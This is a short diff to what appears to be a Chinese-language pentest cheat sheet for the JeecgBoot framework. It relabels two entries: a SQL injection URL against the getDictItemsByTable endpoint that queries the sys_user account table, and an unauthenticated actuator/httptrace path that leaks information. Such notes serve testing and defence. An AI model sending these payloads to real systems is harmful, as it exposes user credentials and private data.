@@ -121,9 +121,10 @@ OSS存储数据列表：
 ```
 漏洞
 ```
-报错或账号密码查询
+sql注入
+账号密码查询
 /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js
 
-信息泄露
+未授权信息泄露
 /jeecg-boot/actuator/httptrace/
 ```
